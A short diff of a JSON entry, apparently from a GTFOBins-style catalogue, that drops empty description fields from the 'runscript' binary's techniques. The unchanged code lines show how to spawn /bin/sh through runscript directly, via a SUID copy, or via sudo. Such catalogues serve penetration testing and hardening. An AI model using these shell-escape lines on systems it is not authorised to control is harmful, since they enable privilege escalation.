@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nrunscript $TF\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
       }
     ]
